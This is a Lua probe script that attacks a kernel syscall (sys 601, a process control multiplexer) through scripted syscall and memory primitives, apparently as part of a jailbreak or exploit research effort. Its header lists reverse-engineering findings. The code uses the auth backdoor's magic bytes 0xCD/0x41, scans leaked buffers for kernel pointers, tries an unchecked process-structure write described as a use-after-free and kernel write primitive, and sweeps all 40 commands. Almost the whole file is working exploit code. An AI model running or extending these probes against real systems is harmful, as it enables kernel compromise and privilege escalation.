-- CRASH_CLASS: MODERATE
-- PROBE 55d: sys 601 Process Control Multiplexer — careful command scan
--
-- Context: RE analysis (sys_601_deep.md) shows 16KB handler, narg=3, 40-entry jump table.
-- CRITICAL findings:
--   cmd 0x0c: hardcoded auth backdoor (XOR 0xCD, 0x41)
--   cmd 0x12: unchecked process struct write (proc+0x578/+0x580, kfree'd in teardown)
--   cmd 0x05: 0xb8-byte process info leak, NO auth
--   cmd 0x10: 0x1000-byte kernel alloc → copyout, NO auth
--   cmd 0x09: global byte leak at 0x316d0f8
--
-- Plan: safe recon first, then backdoor test, then careful writes

print("=== PROBE 55d: sys 601 PROCESS CONTROL MULTIPLEXER ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X_%08X", h, l)
end

local sc601 = make_syscall(601)
local sc20 = make_syscall(20)

local function alive()
    local ok, v = pcall(function() return sc20() end)
    return ok
end

local pid_ok, pid_val = pcall(function() return sc20() end)
local pid = to_num(pid_val)
print("PID: " .. pid)

-- ============================================================
-- [A] cmd 0x00 — Process state query + lock (safe recon)
-- ============================================================
print("")
print("[A] cmd 0x00 — process state query")
do
    local buf = memory.alloc(0x200)
    for i = 0, 0x1FC, 4 do safe_wd(buf + i, 0) end
    local ok, ret = pcall(function()
        return sc601(uint64(0x00), uint64(buf), uint64(0x200))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        for off = 0, 0x40, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, v))
            end
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [B] cmd 0x05 — 0xb8-byte process info leak (NO auth per RE)
-- ============================================================
print("")
print("[B] cmd 0x05 — process info leak (0xb8 bytes)")
do
    local buf = memory.alloc(0x200)
    for i = 0, 0x1FC, 4 do safe_wd(buf + i, 0) end
    -- Try: arg1=buf (output), arg2=size
    local ok, ret = pcall(function()
        return sc601(uint64(0x05), uint64(buf), uint64(0xb8))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        local any_kptr = false
        for off = 0, 0xB4, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, v))
            end
        end
        -- Check qwords for kernel pointers
        for off = 0, 0xB0, 8 do
            local lo = safe_rd(buf + off)
            local hi = safe_rd(buf + off + 4)
            if hi and hi >= 0xFFFF8000 and lo and lo ~= 0 then
                print(string.format("    +0x%02X QWORD: 0x%08X_%08X  <<< KERNEL PTR!", off, hi, lo))
                any_kptr = true
            end
        end
        if any_kptr then
            print("  >>> KERNEL POINTER FOUND!")
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- Also try with arg1=0 (self?) and arg2=buf
print("  [B2] alt layout: arg1=0, arg2=buf")
do
    local buf = memory.alloc(0x200)
    for i = 0, 0x1FC, 4 do safe_wd(buf + i, 0) end
    local ok, ret = pcall(function()
        return sc601(uint64(0x05), uint64(0), uint64(buf))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        for off = 0, 0xB4, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, v))
            end
        end
        for off = 0, 0xB0, 8 do
            local lo = safe_rd(buf + off)
            local hi = safe_rd(buf + off + 4)
            if hi and hi >= 0xFFFF8000 and lo and lo ~= 0 then
                print(string.format("    +0x%02X QWORD: 0x%08X_%08X  <<< KERNEL PTR!", off, hi, lo))
            end
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [C] cmd 0x06 — Process status via proc+0x40
-- ============================================================
print("")
print("[C] cmd 0x06 — process status")
do
    local buf = memory.alloc(0x100)
    for i = 0, 0xFC, 4 do safe_wd(buf + i, 0) end
    local ok, ret = pcall(function()
        return sc601(uint64(0x06), uint64(buf), uint64(0x100))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        for off = 0, 0x20, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, v))
            end
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [D] cmd 0x09 — Global byte leak (0x316d0f8)
-- ============================================================
print("")
print("[D] cmd 0x09 — global byte leak")
do
    local buf = memory.alloc(0x100)
    for i = 0, 0xFC, 4 do safe_wd(buf + i, 0) end
    local ok, ret = pcall(function()
        return sc601(uint64(0x09), uint64(buf), uint64(0x100))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        for off = 0, 0x10, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, v))
            end
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [E] cmd 0x0a — Process +0x568→+0xe8 read
-- ============================================================
print("")
print("[E] cmd 0x0a — process indirect read")
do
    local buf = memory.alloc(0x100)
    for i = 0, 0xFC, 4 do safe_wd(buf + i, 0) end
    local ok, ret = pcall(function()
        return sc601(uint64(0x0a), uint64(buf), uint64(0x100))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        for off = 0, 0x20, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, v))
            end
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [F] cmd 0x0d — Thread enumeration via linked list
-- ============================================================
print("")
print("[F] cmd 0x0d — thread enumeration")
do
    local buf = memory.alloc(0x200)
    for i = 0, 0x1FC, 4 do safe_wd(buf + i, 0) end
    local ok, ret = pcall(function()
        return sc601(uint64(0x0d), uint64(buf), uint64(0x200))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        for off = 0, 0x40, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, v))
            end
        end
        for off = 0, 0x38, 8 do
            local lo = safe_rd(buf + off)
            local hi = safe_rd(buf + off + 4)
            if hi and hi >= 0xFFFF8000 and lo and lo ~= 0 then
                print(string.format("    +0x%02X QWORD: 0x%08X_%08X  <<< KERNEL PTR!", off, hi, lo))
            end
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [G] cmd 0x10 — 0x1000-byte kernel alloc → copyout (NO auth)
-- ============================================================
print("")
print("[G] cmd 0x10 — kernel page copyout (0x1000 bytes)")
do
    local buf = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do safe_wd(buf + i, 0) end
    local ok, ret = pcall(function()
        return sc601(uint64(0x10), uint64(buf), uint64(0x1000))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        local kptr_count = 0
        local nonzero = 0
        for off = 0, 0xFFC, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then nonzero = nonzero + 1 end
        end
        print("  nonzero dwords: " .. nonzero)
        -- Dump first 0x80 bytes
        for off = 0, 0x7C, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, v))
            end
        end
        -- Full kernel pointer scan
        for off = 0, 0xFF8, 8 do
            local lo = safe_rd(buf + off)
            local hi = safe_rd(buf + off + 4)
            if hi and hi >= 0xFFFF8000 and lo and lo ~= 0 then
                print(string.format("    +0x%03X QWORD: 0x%08X_%08X  <<< KERNEL PTR!", off, hi, lo))
                kptr_count = kptr_count + 1
            end
        end
        if kptr_count > 0 then
            print("  >>> " .. kptr_count .. " KERNEL POINTERS FOUND!")
        else
            print("  no kernel pointers")
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [H] cmd 0x13–0x19 — Device state reads + name matching
-- ============================================================
print("")
print("[H] cmd 0x13-0x19 — device state reads")
for cmd = 0x13, 0x19 do
    local buf = memory.alloc(0x100)
    for i = 0, 0xFC, 4 do safe_wd(buf + i, 0) end
    local ok, ret = pcall(function()
        return sc601(uint64(cmd), uint64(buf), uint64(0x100))
    end)
    if ok then
        local h, l = get_hi_lo(ret)
        local b0 = safe_rd(buf)
        local b4 = safe_rd(buf + 4)
        if l ~= 0xFFFFFFFF or (b0 and b0 ~= 0) then
            print(string.format("  0x%02X: ret=%s buf=%08X %08X", cmd, hexval(ret), b0 or 0, b4 or 0))
        else
            print(string.format("  0x%02X: ret=-1", cmd))
        end
    else
        print(string.format("  0x%02X: CRASHED", cmd))
        if not alive() then print("  PROCESS DEAD after cmd " .. string.format("0x%02X", cmd)); return end
    end
end

-- ============================================================
-- [I] cmd 0x07 — BEXTR bitfield extraction
-- ============================================================
print("")
print("[I] cmd 0x07 — BEXTR extraction")
do
    local buf = memory.alloc(0x100)
    for i = 0, 0xFC, 4 do safe_wd(buf + i, 0) end
    local ok, ret = pcall(function()
        return sc601(uint64(0x07), uint64(buf), uint64(0x100))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        for off = 0, 0x20, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, v))
            end
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [J] ★★★ cmd 0x0c — HARDCODED AUTH BACKDOOR
-- RE shows: xor al, 0xCD; xor cl, 0x41; or cl, al → must be 0
-- Need to send bytes {0xCD, 0x41} as arg1
-- ============================================================
print("")
print("[J] ★★★ cmd 0x0c — HARDCODED AUTH BACKDOOR TEST")

-- The auth check reads 2 bytes from arg1 (user pointer).
-- Create buffer with magic bytes 0xCD, 0x41
local authbuf = memory.alloc(0x100)
for i = 0, 0xFC, 4 do safe_wd(authbuf + i, 0) end
-- Write 0xCD at byte 0, 0x41 at byte 1 → dword = 0x000041CD (little-endian)
safe_wd(authbuf, 0x000041CD)

local outbuf = memory.alloc(0x200)
for i = 0, 0x1FC, 4 do safe_wd(outbuf + i, 0) end

-- Try: cmd=0x0c, arg1=authbuf (pointer to auth bytes), arg2=outbuf
print("  [J1] arg1=authbuf(0xCD,0x41), arg2=outbuf")
do
    local ok, ret = pcall(function()
        return sc601(uint64(0x0c), uint64(authbuf), uint64(outbuf))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        local h, l = get_hi_lo(ret)
        if l == 0 then
            print("  >>> BACKDOOR RETURNED SUCCESS (ret=0)!")
        end
        for off = 0, 0x40, 4 do
            local v = safe_rd(outbuf + off)
            if v and v ~= 0 then
                print(string.format("    out+0x%02X: 0x%08X", off, v))
            end
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- Try wrong bytes to confirm it rejects
print("  [J2] wrong bytes (0x00, 0x00) — should fail")
do
    safe_wd(authbuf, 0x00000000)
    for i = 0, 0x1FC, 4 do safe_wd(outbuf + i, 0) end
    local ok, ret = pcall(function()
        return sc601(uint64(0x0c), uint64(authbuf), uint64(outbuf))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- Try with auth bytes as direct value instead of pointer
print("  [J3] arg1=0x41CD (direct value, not pointer)")
do
    for i = 0, 0x1FC, 4 do safe_wd(outbuf + i, 0) end
    local ok, ret = pcall(function()
        return sc601(uint64(0x0c), uint64(0x41CD), uint64(outbuf))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [K] cmd 0x01 — Process init (reads +0x568 state)
-- Needed before cmd 0x12 works? RE says it sets up state.
-- ============================================================
print("")
print("[K] cmd 0x01 — process init")
do
    local buf = memory.alloc(0x100)
    for i = 0, 0xFC, 4 do safe_wd(buf + i, 0) end
    local ok, ret = pcall(function()
        return sc601(uint64(0x01), uint64(buf), uint64(0x100))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        for off = 0, 0x20, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, v))
            end
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [L] ★★★ cmd 0x12 — UNCHECKED PROCESS STRUCT WRITE
-- RE: writes user values to proc+0x578 and proc+0x580
-- These are kernel heap pointers (freed in teardown → UAF/arbitrary kfree)
-- One-shot gate: bit 10 of proc+0x528 must be clear (first call always works)
--
-- CAUTION: only READ first to see what's there. Do NOT write arbitrary values.
-- ============================================================
print("")
print("[L] ★★★ cmd 0x12 — process struct write")

-- First try: just call it with recognizable sentinel values
-- Use values that are clearly NOT valid kernel pointers so kfree won't crash
-- on teardown. Use 0x4141414141414141 as sentinel.
-- Actually, safer: just see if the call succeeds with 0 values first.
print("  [L1] arg1=0, arg2=0 (null write test)")
do
    local ok, ret = pcall(function()
        return sc601(uint64(0x12), uint64(0), uint64(0))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        local h, l = get_hi_lo(ret)
        if l == 0 then
            print("  >>> CMD 0x12 RETURNED SUCCESS!")
            print("  >>> proc+0x578 and proc+0x580 may now be zeroed")
            print("  >>> This is a KERNEL WRITE PRIMITIVE if confirmed")
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- If it succeeded, try with pointer args (copyin from user buffer)
print("  [L2] arg1=buf (copyin attempt), arg2=0")
do
    local buf = memory.alloc(0x100)
    -- Write recognizable pattern
    safe_wq(buf, uint64("0x4141414142424242"))
    safe_wq(buf + 8, uint64("0x4343434344444444"))
    local ok, ret = pcall(function()
        return sc601(uint64(0x12), uint64(buf), uint64(0))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [M] Full command scan 0x00-0x27 for completeness
-- ============================================================
print("")
print("[M] Full cmd scan 0x00-0x27")
for cmd = 0x00, 0x27 do
    -- Skip ones we already tested in detail
    if cmd ~= 0x00 and cmd ~= 0x05 and cmd ~= 0x06 and cmd ~= 0x07
       and cmd ~= 0x09 and cmd ~= 0x0a and cmd ~= 0x0c and cmd ~= 0x0d
       and cmd ~= 0x10 and cmd ~= 0x12 and cmd ~= 0x01
       and cmd ~= 0x13 and cmd ~= 0x14 and cmd ~= 0x15 and cmd ~= 0x16
       and cmd ~= 0x17 and cmd ~= 0x18 and cmd ~= 0x19 then
        local buf = memory.alloc(0x100)
        for i = 0, 0xFC, 4 do safe_wd(buf + i, 0) end
        local ok, ret = pcall(function()
            return sc601(uint64(cmd), uint64(buf), uint64(0x100))
        end)
        if ok then
            local h, l = get_hi_lo(ret)
            local b0 = safe_rd(buf)
            print(string.format("  0x%02X: ret=%s buf[0]=%08X", cmd, hexval(ret), b0 or 0))
        else
            print(string.format("  0x%02X: CRASHED", cmd))
            if not alive() then print("  PROCESS DEAD after cmd " .. string.format("0x%02X", cmd)); return end
        end
    end
end

-- ============================================================
-- [N] cmd 0x0e/0x0f — partial auth commands
-- ============================================================
print("")
print("[N] cmd 0x0e — partial auth")
do
    local buf = memory.alloc(0x100)
    for i = 0, 0xFC, 4 do safe_wd(buf + i, 0) end
    local ok, ret = pcall(function()
        return sc601(uint64(0x0e), uint64(buf), uint64(0x100))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        for off = 0, 0x20, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, v))
            end
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

print("")
print("=== PROBE 55d COMPLETE ===")
